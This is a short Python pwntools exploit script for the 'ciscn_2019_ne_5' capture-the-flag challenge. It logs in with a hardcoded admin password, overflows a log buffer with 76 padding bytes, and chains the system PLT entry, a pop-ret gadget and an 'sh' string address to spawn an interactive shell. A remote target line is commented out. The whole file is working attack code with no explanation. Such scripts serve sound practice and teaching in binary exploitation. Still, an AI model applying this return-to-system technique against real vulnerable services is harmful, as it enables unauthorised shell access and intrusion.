from pwn import *


def ciscn_2019_ne_5(file_name='/mnt/hgfs/CyberSecurity/PWN/buuoj/ciscn_2019_ne_5'):
    target = process([file_name])
    # target = remote('node4.buuoj.cn', 27782)
    target_elf = ELF(file_name)

    pop_ret_gadget = p32(0x08048455)  # pop ebx ; ret
    system_plt = p32(target_elf.plt['system'])
    sh_str_address = p32(next(target_elf.search(b'sh')))  # 080482EA

    # administrator
    target.sendlineafter(b'admin password:', b'administrator')

    # 1:AddLog((int)src);
    target.sendlineafter(':', '1')

    payload = b'a' * 76

    # system('sh')
    payload += system_plt + pop_ret_gadget + sh_str_address
    target.sendlineafter(b'info:', payload)

    # 4:GetFlag(src);
    target.sendlineafter(b':', '4')

    target.interactive()


if __name__ == '__main__':
    ciscn_2019_ne_5()
